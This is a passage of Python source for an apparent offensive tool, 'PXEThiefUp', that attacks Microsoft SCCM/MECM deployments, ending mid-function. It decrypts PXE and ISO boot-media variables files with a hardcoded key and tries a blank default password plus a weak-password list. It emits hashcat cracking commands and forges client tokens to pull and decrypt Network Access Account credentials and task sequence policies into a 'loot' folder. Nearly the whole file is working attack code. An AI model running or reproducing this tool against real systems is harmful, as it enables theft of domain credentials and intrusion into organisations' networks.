#!/usr/bin/env python3
# PXEThiefUp

import argparse
import binascii
import ipaddress    
import socket
import configparser
import lxml.etree as ET
import math
import requests
import zlib
import datetime as dt
import os
import shutil

# Blurbdust
from certipy.lib.certificate import load_pfx
from sccmwtf import CryptoTools, dateFormat1
from cryptography.hazmat.primitives.asymmetric import padding
import tftpy
from asn1crypto import cms

import media_variable_file_cryptography as media_crypto
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives import hashes

import pycdlib as pycd
from os import walk
from requests_toolbelt import MultipartEncoder,MultipartDecoder
from scapy.all import *
from ipaddress import IPv4Network,IPv4Address
from rich import print
from rich.table import Table
from rich.console import Console
from Registry import Registry
from threading import Thread

import urllib3
from requests_pkcs12 import Pkcs12Adapter

# Scapy global variables
clientIPAddress = ""
clientMacAddress = ""

# HTTP Configuration Options
# Configure proxying for debugging support
USING_PROXY = False 

# HTTPS and client certificate support
USING_TLS = False 
CERT_FILE = "output.crt"
KEY_FILE = "output-key.key"

# MECM Task Sequence Config Options
# The beginning of the DP URL as read from settings.ini; takes precedence over the value retrieved from the media file in decrypt_media_file(), if needed
SCCM_BASE_URL = ""

# Debug Config Options
DUMP_MPKEYINFORMATIONMEDIA_XML = True
DUMP_REPLYASSIGNMENTS_XML = True
DUMP_POLICIES = True

# SMS Variables
SMS_MEDIA_GUID = ""
SMS_TS_MEDIA_PFX = ""
BRANDING_TITLE = ""
SITECODE = ""
STANDALONE_MEDIA = ""
SMS_MEDIA_PFX = ""
SMS_MEDIA_GUID = ""

# Global Variables
BLANK_PASSWORDS_FOUND = False
MEDIATYPE = ""
PASSWORDREQUIRED = ""
UNATTENDED = "" 
VERBOSE = False
base_url_override = None

WORKING_DIR = "loot"

## Crypto Functions
## ------------------
def generateSignedData(data, cryptoProv):
    # SHA1 hash algorithm
    sha1hash = cryptoProv.CryptCreateHash(32772, None)
    sha1hash.CryptHashData(data)

    # Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha1hash.CryptSignHash(1,1)
    return binascii.hexlify(out).decode()

def generateSignedDataLinux(data, key):
    signature = key.sign(data, PKCS1v15(), hashes.SHA1())
    signature_rev = bytearray(signature)
    signature_rev.reverse()
    return bytes(signature_rev)

def generateClientTokenSignature(data, cryptoProv):
    # SHA256 hash algorithm
    sha256hash = cryptoProv.CryptCreateHash(32780, None)
    sha256hash.CryptHashData(data)

    # Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha256hash.CryptSignHash(1,1)

    return binascii.hexlify(out).decode()

def CryptDecryptMessage(pfx, data):
    info = cms.ContentInfo.load(data)
    digested_data = info['content']
    key_algo = digested_data['recipient_infos'].native[0]['key_encryption_algorithm']['algorithm']
    key = b""
    if key_algo == 'rsaes_pkcs1v15':
        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
        key = pfx.decrypt(session_key, padding.PKCS1v15())
    elif key_algo == 'rsaes_oaep':
        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
        pad = padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None)
        key = pfx.decrypt(session_key, pad)
    else:
        print(f"{key_algo} not implemented yet")
    iv = digested_data['encrypted_content_info']['content_encryption_algorithm']['parameters'].native
    ciphertext = digested_data['encrypted_content_info']['encrypted_content'].native
    decrypted_data = b""
    enc_algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native

    if enc_algo == 'tripledes_3key':
        algo = 'CALG_3DES'
    elif enc_algo == 'aes256_cbc':
        algo = 'CALG_AES_256'
    else:
        print(f"{enc_algo} not implemented yet")
        return None

    decrypted_data = media_crypto.decrypt_file(algo, ciphertext, key, iv, decode=False)

    return decrypted_data

def decrypt_file(path, password):
    # Uses the decryption class from media_decryption to decrypt a file
    """ 
    # Decrypt encryted file type using the password provided
    # password must be already encoded to utf-16-le
    global PASSWORD
    # read_media_variable_file reads out the raw file, skips the first 24 bytes, then skips the last 8 bytes
    encrypted_file = media_crypto.read_media_variable_file(path)
    try:
        # Derive the key from the password
        key = media_crypto.aes_des_key_derivation(password)
        
        last_16 = math.floor(len(encrypted_file)/16) * 16
        
        # For future Adam, Key Lens are defined by Microsoft here: https://learn.microsoft.com/en-us/windows/win32/seccrypto/aes-provider-algorithms
        # This current implementation only supports AES-128, so we use the first 16 bytes of the derived key 

        decrypted_file = media_crypto.aes128_decrypt(encrypted_file[:last_16], key[:16])

        decrypted_file =  decrypted_file[:decrypted_file.rfind('\x00')]
        
        wf_decrypted_ts = "".join(c for c in decrypted_file if c.isprintable())

        return True, wf_decrypted_ts
    except:
        return False, None
    """
    media_decryption = media_crypto.media_decryption(path)
    return media_decryption.decrypt_media_file(password)

def decrypt_media_file(path, password):
    # print(f"{password} {path}")
    password_is_string = True
    if type(password) != str:
        password_is_string = False

    if (VERBOSE):
        print_nice("Media variables file to decrypt: " + path, "INFO")
    if (password_is_string):
        if (VERBOSE):
            print_nice(f"Password provided: {password}", "INFO")
        formatted_password = password.encode("utf-16-le")
    else:
        if (VERBOSE):
            print_nice(f"Password provided: 0x{password.hex()}", "INFO")
        formatted_password = password

    response, decrypt_media_file = decrypt_file(path, formatted_password)
    if (response == True):
        if (VERBOSE):
            print_nice("Successfully decrypted media variables file", "SUCCESS")
        return decrypt_media_file
    else:
        print_nice("Failed to decrypt media variables file.", "ERROR")
        print_nice(f"Password provided: {password}", "INFO")
        print_nice("Generating hash for cracking", "INFO")
        generate_hashcat_output(path)
        return None

def decrypt_policy_file(path, password):
    password_is_string = True
    if type(password) != str:
        password_is_string = False
    
    if (VERBOSE):
        print_nice("Policy file to decrypt: " + path, "INFO")
    if (password_is_string):
        if (VERBOSE):
            print_nice(f"Password provided: {password}", "INFO")
        formatted_password = password.encode("utf-16-le")
    else:
        if (VERBOSE):
            print_nice(f"Password provided: 0x{password.hex()}", "INFO")
        formatted_password = password

    response, decrypt_policy_file = decrypt_file(path, formatted_password)
    if (response == True):
        if (VERBOSE):
            print_nice("Successfully Decrypted Policy file", "SUCCESS")
        return decrypt_policy_file
    else:
        print_nice("Failed to decrypt Policy file.", "ERROR")
        print_nice(f"Password provided: {password}", "INFO")

def deobfuscate_credential_string(credential_string):
    # Algorithm marker is embedded in the credential string structure: 1066 =
    # AES-256, 0366 = 3DES. Newer MECM emits AES-256 here; older releases used 3DES.
    algo_bytes = credential_string[112:116]
    if algo_bytes == "1066":
        algo = "aes256"
    elif algo_bytes == "0366":
        algo = "3des"
    else:
        # Unrecognised marker - fall back to the historical 3DES default so older
        # media that this tool already handled is not regressed.
        algo = "3des"

    key_data = binascii.unhexlify(credential_string[8:88])
    encrypted_data = binascii.unhexlify(credential_string[128:])
    key = media_crypto.aes_des_key_derivation(key_data)

    try:
        if algo == "3des":
            last = math.floor(len(encrypted_data) / 8) * 8
            return media_crypto._3des_decrypt(encrypted_data[:last], key[:24])
        else:
            last = math.floor(len(encrypted_data) / 16) * 16
            return media_crypto.aes256_decrypt(encrypted_data[:last], key[:32])
    except Exception:
        return ""

def decrypt_pxe_media_from_encrypted_key(encrypted_key, media_file_path):
    #ProxyDHCP Option 243
    length = encrypted_key[0]

    # Pull out the encrypted bytes from the DHCP response
    encrypted_bytes = encrypted_key[1:1+length]

    # Isolate encrypted data bytes
    encrypted_bytes = encrypted_bytes[20:-12]

    # Hardcoded in tspxe.dll
    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9'

    # The DHCP-wrapped key carries no algorithm identifier. Newer MECM builds wrap
    # it with AES-256 while older ones use AES-128, so try both and keep whichever
    # derived key actually decrypts the media variables file. This is the blank
    # password path (PXE media with no user-set password).
    for algorithm in ('CALG_AES_256', 'CALG_AES_128'):
        media_decryption = media_crypto.media_decryption(media_data=encrypted_bytes)
        media_decryption.set_encryption_type(algorithm)
        key_decrypted, var_file_key = media_decryption.decrypt_media_file(key_data, decode=False)
        if not key_decrypted or var_file_key is None or len(var_file_key) < 10:
            continue

        # 10 byte output
        var_file_key = var_file_key[:10]

        # Perform bit extension on the 10-byte secret to produce the 20-byte password
        # used to derive the variables file key (each source byte is followed by 0xFF
        # if its top bit is set, otherwise 0x00).
        LEADING_BIT_MASK = b'\x80'
        new_key = bytearray()
        for byte in struct.unpack('10c', var_file_key):
            if (LEADING_BIT_MASK[0] & byte[0]) == 128:
                new_key = new_key + byte + b'\xFF'
            else:
                new_key = new_key + byte + b'\x00'

        # Verify this candidate actually decrypts the variables file (and produces
        # XML) before accepting it, so a wrong unwrapping algorithm is skipped.
        response, candidate = decrypt_file(media_file_path, bytes(new_key))
        if response and candidate and candidate.lstrip().startswith("<"):
            if (VERBOSE):
                print_nice(f"DHCP-wrapped key algorithm: {algorithm}", "INFO")
            return candidate

    print_nice("Failed to decrypt media variables file using DHCP-supplied key", "ERROR")
    generate_hashcat_output(media_file_path)
    return None

## File I/O Functions
## ------------------
def write_to_file(path, filename, contents, type="xml"):
    # Check for file path existence
    if not os.path.exists(path):
        os.makedirs(path)
    if type == "binary":
        full_path = os.path.join(path, filename)
    elif type == "xml":
        full_path = os.path.join(path, filename + ".xml")
    else:
        full_path = os.path.join(path, filename + "." + type)

    # Pick text vs binary mode from the actual payload type so callers can pass
    # either str or bytes regardless of the file extension they asked for. This
    # fixes writing raw HTTP policy bodies (bytes) with type="xml".
    is_bytes = isinstance(contents, (bytes, bytearray, memoryview))
    mode = "wb" if is_bytes else "w"
    with open(full_path, mode) as f:
        f.write(contents)

def copy_file_to_dir(file_path:str, target_dir:str, delete_original:bool = False):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    filename = os.path.basename(file_path)
    target_path = os.path.join(target_dir, filename)
    
    # Check if the file exists already, and just return it if it exists, catches an ISO issue for temp files
    if (os.path.exists(target_path)):
        return target_path
    shutil.copy2(file_path, target_path)
    if delete_original:
        os.remove(file_path)
    return target_path

def scan_for_files(path):
    f = []
    variables_file = None
    policy_file = None
    bcd_file = None

    for (dirpath, dirnames, filenames) in walk(path):
        f.extend(filenames)
        break

    for file in f:
        if file.endswith(".iso"):
            print_nice(f"Found ISO file: {file}", "INFO")
            variables, policy, password, variables_loot_path, policy_loot_path = search_through_iso((os.path.abspath(os.path.join(path, file))))
            if (variables and policy):
                #print("[+] Found both variables and policy files in the ISO")
                return variables_loot_path, policy_loot_path, None
            elif (variables):
                #print("[+] Found variables file in the ISO")
                return variables_loot_path, policy_file, None
    
    # .var file candidates are tracked by priority so explicitly named files
    # win over generic PXE-served names (e.g. 0000000018.var) when both exist
    var_candidates = {"named": None, "boot": None, "generic": None}

    for file in f:
        #print(file)
        full_path = os.path.abspath(os.path.join(path, file))
        lower_name = file.lower()
        if file.endswith(".dat"):
            if "variables" in lower_name:
                variables_file = full_path
        if file.endswith(".var"):
            if "variables" in lower_name:
                var_candidates["named"] = full_path
            # Detection for boot.var files
            elif (file.split(".")[-2].lower() == "boot"):
                var_candidates["boot"] = full_path
            # Generic .var file as served by PXE (e.g. 0000000018.var). Validate
            # the media file header so non-media .var files are not picked up.
            elif (media_crypto.read_media_variable_file_header(full_path) is not None):
                var_candidates["generic"] = full_path
        if file.endswith(".bcd"):
            # BCD (Boot Configuration Data) registry hive served alongside the
            # PXE variables file. Preserved as evidence alongside the variables.
            bcd_file = full_path
        if file.endswith(".xml"):
            if "policy" in lower_name:
                policy_file = full_path

    # Resolve the variables file: explicit .dat > named .var > boot.var > generic .var
    if variables_file is None:
        for key in ("named", "boot", "generic"):
            if var_candidates[key] is not None:
                variables_file = var_candidates[key]
                break

    return variables_file, policy_file, bcd_file

def search_through_iso(isoPath):
    global MEDIATYPE
    global PASSWORDREQUIRED
    global UNATTENDED

    variables = None
    policy = None
    password = None
    variables_loot_path = None
    policy_loot_path = None

    ISOLOOT = os.path.abspath(os.path.join(WORKING_DIR, ".temp_media_location"))
    if not os.path.exists(ISOLOOT):
        os.makedirs(ISOLOOT)

    # Hacky solution for windows and linux...
    isoName = isoPath.split("\\")[-1]
    isoName = isoName.split("/")[-1]
    
    abso_path = os.path.abspath(isoPath)
    #print(f"[+] Searching through ISO: {abso_path}")
    iso = pycd.PyCdlib()
    iso.open(abso_path)

    for dirname, dirlist, filelist in iso.walk(udf_path='/SMS/data'):
        #print(f"[+] Found files: {filelist}")
        variables_file = io.BytesIO()
        policy_file = io.BytesIO()
        bootstrap_file = io.BytesIO()
        policy_data = None
        variables_data = None
        bootstrap_data = None

        for file in filelist:
            if file.endswith(".ini"):
                if "bootstrap" in file.lower():
                    #print(f"[+] Found Bootstrap file")
                    iso.get_file_from_iso_fp(bootstrap_file, udf_path=('/SMS/data/' + file))
                    bootstrap_data = bootstrap_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, bootstrap_data, "binary")
            if file.endswith(".xml"):
                if "policy" in file.lower():
                    #print(f"[+] Found Policy file")
                    iso.get_file_from_iso_fp(policy_file, udf_path=('/SMS/data/' + file))
                    policy_data = policy_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, policy_data, "binary")
            if file.endswith(".dat"):
                if "variables" in file.lower():
                    pathForFile = '/SMS/data/' + file
                    #print(f"[+] Found Variables file")
                    iso.get_file_from_iso_fp(variables_file, udf_path=pathForFile)
                    variables_data = variables_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, variables_data, "binary")
                    
    iso_extracts = []
    for (dirpath, dirnames, filenames) in walk(ISOLOOT):
        iso_extracts.extend(filenames)
        break

    if (bootstrap_data is not None):
        for file in iso_extracts:
            if "bootstrap" in file.lower():
                #print("[+] Parsing TSMBootstrap.ini file for media information...")
                parse_bootstrap_ini((os.path.join(ISOLOOT, file)))
            elif "variables" in file.lower():
                #print("[+] Found Variables file in ISO")
                variables_loot_path = os.path.join(ISOLOOT, file)
            elif "policy" in file.lower():
                #print("[+] Found Policy file in ISO")
                policy_loot_path = os.path.join(ISOLOOT, file)
        

        if (MEDIATYPE == "FullMedia"):
            # Both Variables and Policy files are present
            policy = True
            variables = True
        else:
            # Only Variables
            variables = True
        
        if (PASSWORDREQUIRED == "false"):
            # Default Password in use
            password = False
        else:
            # Password is required
            password = True

    return variables, policy, password, variables_loot_path, policy_loot_path

def parse_bootstrap_ini(bootstrap_data):
    global MEDIATYPE
    global PASSWORDREQUIRED
    global UNATTENDED
    # Parse the TSMBootstrap.ini file
    config = configparser.ConfigParser()
    config.read(bootstrap_data)
    MEDIATYPE = (config['MediaInfo']['MediaType'])
    PASSWORDREQUIRED = (config['MediaInfo']['PasswordRequired'])
    UNATTENDED = (config['MediaInfo']['Unattended'])
    # Cleanup the folder 
    os.remove(bootstrap_data)

## Helper Function
## ------------------
def _safe_str(s):
    # Sanitise a string for the Windows console (cp1252 codepage). rich.print
    # crashes with UnicodeEncodeError when it encounters characters outside the
    # console's encoding (e.g. Hebrew/codepoints from binary BCD data decoded
    # as UTF-16LE). Replace them so output never crashes.
    if not isinstance(s, str):
        s = str(s)
    try:
        s.encode("cp1252")
        return s
    except UnicodeEncodeError:
        return s.encode("cp1252", errors="replace").decode("cp1252")

def print_nice(data, type = "INFO"):
    data = _safe_str(data)
    if (type == "ERROR"):
        print("[red][!][red] " + data)
    elif (type == "INFO"):
        print("[yellow][?][yellow] " + data)
    elif (type == "SUCCESS"):
        print("[green][+][green] " + data)
    else:
        print("[*] " + data)

def list_network_interfaces():
    print_nice("Listing available network interfaces...", "INFO")

    # Get list of available interfaces
    interface2 = scapy.interfaces.get_working_ifaces()

    # Use a table to do the rest
    interface_table = Table(title="Available Network Interfaces")
    interface_table.add_column("Index", justify="center", no_wrap=True)
    interface_table.add_column("Name", justify="center", no_wrap=True)
    interface_table.add_column("Description", justify="center", no_wrap=True)
    interface_table.add_column("MAC Address", justify="center", no_wrap=True)
    interface_table.add_column("IP Address", justify="center", no_wrap=True)

    # Sort interfaces by index because I am a bit OCD about that
    interface2 = sorted(interface2, key=lambda x: x.index)

    for i in interface2:
        #print_nice(i, "INFO")
        if i.is_valid == False:
            continue
        else:
            flags = (i.flags)
            if "DISCONNECTED" in flags:
                continue
            else:
                interface_table.add_row(str(i.index), str(i.ip), str(i.mac), str(i.name), str(i.description))
                #print(i.index)
                #print(i.name)
                #print(i.description)
                #print(i.mac)
                #print(i.ip)
                #for flag in flags:
                #    print(flag)
                #print(i.flags)
    console = Console()
    console.print(interface_table)

def validate_ip_or_resolve_hostname(input):
    # Verify if the input has a leading protocol and strip it if so
    if (input.startswith("http://") or input.startswith("https://")):
        input = input.split("/")[2]
    try:
        # Try and see if the IP address is valid
        ipaddress.ip_address(input)
        ip_address = input
    except:
        try:
            # Try and resolve the Hostname on the network
            ip_address = socket.gethostbyname(input.strip())
        except:
            print_nice(input + " does not appear to be a valid hostname or address (or DNS does not resolve)", "ERROR")
            return None
    return ip_address

def generate_hashcat_output(input):
    hash = media_crypto.read_media_variable_file_header(input)

    print_nice(f"[yellow]Hash[white]: {hash}")
    print_nice(f"[yellow]Hashcat mode[white]: 19850 (requires https://github.com/The-Viper-One/hashcat-6.2.6-SCCM)")
    # Note for future self: the current hashcat mode only supports AES-128...
    print_nice(f"[yellow]Command[white]: \nhashcat -m 19850 -a 0 '{hash}' '..\\rockyou(1).txt'")

def test_default_weak_passwords_on_media(path):
    blankPassword = ("{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}").encode("utf-16-le")
    passwords = {
        "1234",
        "123456",
        "12345678",
        "123456789",
        "password",
        "password1",
        "password123",
        "admin",
        "administrator",
        "root",
        "letmein",
        "qwerty",
        "abc123",
        "welcome",
        "Welcome1",
        "god",
        "love",
        "P@ssw0rd",
        "P@ssword",
        "P@ssw0rd1",
        "P@ssword1",
    }

    if (VERBOSE):
        print_nice("Media variables file to decrypt: " + path, "INFO")

    response, decrypt_media_file = decrypt_file(path, blankPassword)
    if (response == True):
        print_nice("Successfully decrypted media variables file with default password", "SUCCESS")
        #write_to_file(WORKING_DIR, "variables_decrypted", decrypt_media_file)
        return True, decrypt_media_file, blankPassword

    for password in passwords:
        response, decrypt_media_file = decrypt_file(path, password)
        if (response == True):
            print_nice(f"Successfully decrypted media variables file with password: {password}", "SUCCESS")
            #write_to_file(WORKING_DIR, "variables_decrypted", decrypt_media_file)
            return True, decrypt_media_file, password

    print_nice("Failed to decrypt media variables file with blank or default passwords", "ERROR")
    generate_hashcat_output(path)
    return False, None, None

## Networking
## ------------------
def configure_scapy_networking(ip_address, interface=None):
    # If user has provided a target IP address, use it to determine interface to send traffic out of
    if ip_address is not None:
        ip_address = validate_ip_or_resolve_hostname(ip_address)
        if ip_address is None:
            print_nice("Unable to resolve provided target IP address or hostname", "ERROR")
            return False
        else:
            route_info = conf.route.route(ip_address,verbose=0)
            interface_ip = route_info[1]

            if interface_ip != "0.0.0.0":
                conf.iface = route_info[0]
            else:
                print_nice(f"No route found to target host {ip_address}", "ERROR")
                return False
    if interface is not None:
        print_nice(f"Attemting to use Interface ID {str(interface)}")
        conf.iface = conf.ifaces.dev_from_index(interface)
    else:
        #Automatically attempt sane interface configuration
        config = configparser.ConfigParser(allow_no_value=True)
        config.read('settings.ini')
        scapy_config = config["SCAPY SETTINGS"]
        
        if scapy_config.get("manual_interface_selection_by_id"):
            try:
                manual_selection_mode_id = scapy_config.getint("manual_interface_selection_by_id")
            except:
                print_nice("Invalid value set for 'manual_interface_selection_by_id' in 'settings.ini' file. Please specify an integer associated with the desired interface, or leave the field blank for automatic interface selection", "ERROR")
                return False
        else:
            manual_selection_mode_id = None

        if manual_selection_mode_id:
            print_nice(f"Attemting to use Interface ID {str(manual_selection_mode_id)} provided in setttings.ini")
            conf.iface = conf.ifaces.dev_from_index(manual_selection_mode_id)
        else:
            print_nice("Attemting automatic interface detection")
            selection_mode = scapy_config.getint("automatic_interface_selection_mode")
            # 1 - Use interface that can reach default GW as output interface, 2 - First interface with no autoconfigure or localhost IP address 
            try_next_mode = False
            if selection_mode == 1:

                default_gw = conf.route.route("0.0.0.0",verbose=0)
                default_gw_ip = conf.route.route("0.0.0.0",verbose=0)[2]
                
                #If there is a default gw found, set scapy to use that interface
                if default_gw_ip != '0.0.0.0':
                    conf.iface = default_gw[0]
                else: 
                    try_next_mode = True

            if selection_mode == 2 or try_next_mode:

                loopback_range = IPv4Network('127.0.0.0/8')
                autoconfigure_ranges = IPv4Network('169.254.0.0/16')

                interfaces = scapy.interfaces.get_working_ifaces()
                for interface in interfaces:
                    
                    #Read IP from interface
                    ip =  get_if_raw_addr(interface)    
                    if ip:
                        ip = IPv4Address(inet_ntop(socket.AF_INET, ip))
                    else: 
                        continue

                    #If it is a valid IP and is not a loopback or autoconfigure IP, use this interface
                    if ip and not (ip in loopback_range) and not (ip in autoconfigure_ranges):
                        conf.iface = interface
                        break
                    
                #Implement check on conf.iface value
    
    global clientIPAddress
    global clientMacAddress

    clientIPAddress = get_if_addr(conf.iface)
    clientMacAddress = get_if_hwaddr(conf.iface)

    bind_layers(UDP,BOOTP,dport=4011,sport=68) # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
    bind_layers(UDP,BOOTP,dport=68,sport=4011)
    print_nice(f"Using interface: [white]{conf.iface} - {conf.iface.description}")
    return True

## HTTP Functions
## ------------------
def decrypt_http_cert_response_data(key, message, data=False):
    if USING_TLS or data:
        out = message.content.decode("utf-16-le")
    else:
        dstr = CryptDecryptMessage(key, message.content)
        dstr = dstr.decode("utf-16-le")
        out = "".join(c for c in dstr if c.isprintable())
    return out

def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClientIDSignature, CCMClientTimestamp, CCMClientTimestampSignature, clientTokenSignature, key):
    # Retrieve all available Task sequences, NAA config and any identified collection settings and return to parsing function

    # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    # print("[+] Retrieving Needed Metadata from SCCM Server...")

    # Hiding errors 
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    if (VERBOSE):
        print_nice("Target Management Point URL: " + SCCM_BASE_URL, "INFO")
    session = requests.Session()

    # This change was made after a request from a Pentester named Joshua Dean, who found that their enviroment was using mTLS and Certiicates 
    if USING_TLS:
        session.verify = False
        #session.cert = (CERT_FILE,KEY_FILE)
        # So odd that SMS_MEDIA_GUID is the password for the PFX, but is truncated to the first 31 chars only
        session.mount(SCCM_BASE_URL, Pkcs12Adapter(pkcs12_data=binascii.unhexlify(SMS_MEDIA_PFX), pkcs12_password=SMS_MEDIA_GUID[:31]))

        #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs

    if USING_PROXY:
        proxies = {"https":'127.0.0.1:8080'}
        session.proxies = proxies
    
    # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    # Retrieve the Unknown x64 version of the BCD from the management endpoint
    if (VERBOSE):
        print_nice("[+] Retrieving x64UnknownMachineGUID from MECM MP", "INFO")

    r = session.get(SCCM_BASE_URL + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
    if (r.status_code != 200):
        print_nice("Failed to retrieve MPKEYINFORMATIONMEDIA from Management Point. Status Code: " + str(r.status_code), "ERROR")
        return
    else:
        print_nice("Successfully retrieved MPKEYINFORMATIONMEDIA from Management Point", "SUCCESS")

    # Parse XML and retrieve x64UnknownMachineGUID
    root = ET.fromstring(r.text)
    clientID = root.find("UnknownMachines").get("x64UnknownMachineGUID")
    clientID = root.find("UnknownMachines").get("x86UnknownMachineGUID")
    sitecode = root.find("SITECODE").text

    if DUMP_MPKEYINFORMATIONMEDIA_XML:
        # Write ManagementPointKeyInformationMedia XML data to the folder
        write_to_file(WORKING_DIR, "MPKEYINFORMATIONMEDIA", r.text, "xml")

    # Add UTF-16-LE Byte Order Mark (BOM)
    first_payload = b'\xFF\xFE' + (
        '<Msg><ID/><SourceID>' + clientID + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:' + CCMClientID + ';' + CCMClientTimestamp + '\r\nClientTokenSignature:' + clientTokenSignature +'\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>'
    ).encode("utf-16-le")
    
    second_payload = (
        '<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:' + sitecode + '</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>' + clientID + '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n'
    ).encode("utf-16-le") + b'\x00\x00\x00'

    # Send a Message containing our Client ID and our valid token 
    me = MultipartEncoder(fields={
        'Msg': (None, first_payload, "text/plain; charset=UTF-16"), 
        'RequestAssignments': second_payload}
    )
    
    # Send request for the policy assignment 
    if (VERBOSE):
        print_nice("Requesting policy assignments from MP", "INFO")

    r = session.request("CCM_POST",SCCM_BASE_URL + "/ccm_system/request", data=me, headers={'Content-Type': me.content_type.replace("form-data","mixed")})
    multipart_data = MultipartDecoder.from_response(r)

    # Get the zlib compressed policy locations and parse out the URLs for NAAConfig and TaskSequence
    policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
    wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())

    if DUMP_REPLYASSIGNMENTS_XML:
        # Unsure why this is here, but should come back to
        write_to_file(WORKING_DIR, "ReplyAssignments", wf_policy_xml, "xml")

    #Pull relevant configs from RequestAssignments XML
    allPoliciesURLs = {}

    root = ET.fromstring(wf_policy_xml)
    policyAssignments = root.findall("PolicyAssignment")
    dedup = 0

    for policyAssignment in policyAssignments:
        policies = policyAssignment.findall("Policy")
        for policy in policies:
            if policy.get("PolicyCategory") not in allPoliciesURLs and policy.get("PolicyCategory") is not None:
                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>",SCCM_BASE_URL) 
            else:
                if policy.get("PolicyCategory") is None:
                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",SCCM_BASE_URL) 
                else:
                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>",SCCM_BASE_URL) 
                    dedup = dedup + 1

    # Print all policy assignment URLs
    print_nice(f"{len(allPoliciesURLs)} policy assignment URLs found!", "INFO")

    # Header Data for requesting future HTTP Policies
    #headers = {
    #    'CCMClientID': CCMClientID, 
    #    "CCMClientIDSignature" : CCMClientIDSignature, 
    #    "CCMClientTimestamp" : CCMClientTimestamp, 
    #    "CCMClientTimestampSignature" : CCMClientTimestampSignature
    #}

    now = dt.datetime.now(dt.UTC)
    headers = {"Connection": "close","User-Agent": "ConfigMgr Messaging HTTP Sender"}
    headers["ClientToken"] = "{};{}".format(
            CCMClientID.upper(),
            now.strftime(dateFormat1)
          )
    headers["ClientTokenSignature"] = CryptoTools.signNoHash(key, "{};{}".format(CCMClientID.upper(), now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()


    if DUMP_POLICIES:
        POLICY_FOLDER_PREFIX = SCCM_BASE_URL[7:].lstrip("/").rstrip("/")

        policy_folder = WORKING_DIR + "/" + POLICY_FOLDER_PREFIX + "_policies/"
        os.mkdir(policy_folder)
        for category, url in allPoliciesURLs.items():
            if category is not None:
                # Send a request for the policies
                if (VERBOSE):
                    print_nice(f"Requesting {category} from: {url}", "INFO")

                content = session.get(url, headers=headers)
                # Policy response body is raw bytes; write it as binary with an .xml
                # extension (write_to_file also auto-selects binary mode for bytes).
                write_to_file(policy_folder, category + ".xml", content.content, "binary")


    # Make requests for all relevant policies
    colsettings = []
    naaconfig = []
    tsconfig = []
    for category, url in allPoliciesURLs.items():
        if "NAAConfig" in category:
            # Append request for Network Access Account configuration
            if (VERBOSE):
                print_nice(f"Requesting Network Access Account Configuration from: {url}", "INFO")
            naaconfig.append(session.get(url, headers=headers))

        if "TaskSequence" in category:
            # Append request for Task Sequence Configuration
            if (VERBOSE):
                print_nice(f"Requesting Task Sequence Configuration from: {url}", "INFO")
            tsconfig.append(session.get(url, headers=headers))

        if "CollectionSettings" in category:
            # Append request for Collections Settings
            if (VERBOSE):
                print_nice(f"Requesting Collection Settings from: {url}", "INFO")
            colsettings.append(session.get(url, headers=headers))

    # Decrypt the returned policies
    if (VERBOSE):
        print_nice("Decrypting retrieved policies", "INFO")

    if naaconfig is not None and len(naaconfig) > 0:
        naaconfig_decrypted = []
        for i in naaconfig:
            out = decrypt_http_cert_response_data(key, i)
            out2 = "".join(c for c in out if c.isprintable())
            naaconfig_decrypted.append(out2)
        naaconfig = naaconfig_decrypted
    
    if tsconfig is not None and len(tsconfig) > 0:
        tsconfig_decrypted = []
        for i in tsconfig:
            out = decrypt_http_cert_response_data(key, i)
            out2 = "".join(c for c in out if c.isprintable())
            tsconfig_decrypted.append(out2)
        tsconfig = tsconfig_decrypted

    if colsettings is not None and len(colsettings) > 0:
        colsettings_decrypted = []
        for colsetting in colsettings:
            data = False
            try:
                data = colsetting.content.decode("utf-16-le")
                data = True
            except (UnicodeDecodeError, AttributeError):
                pass

            wf_dstr = decrypt_http_cert_response_data(key, colsetting, data)

            # Decrypt and Decompress the data. Use the lenient parser because the
            # decrypted collection settings response can carry trailing CBC padding
            # or extra siblings past the first root.
            root = _parse_policy_xml(wf_dstr)
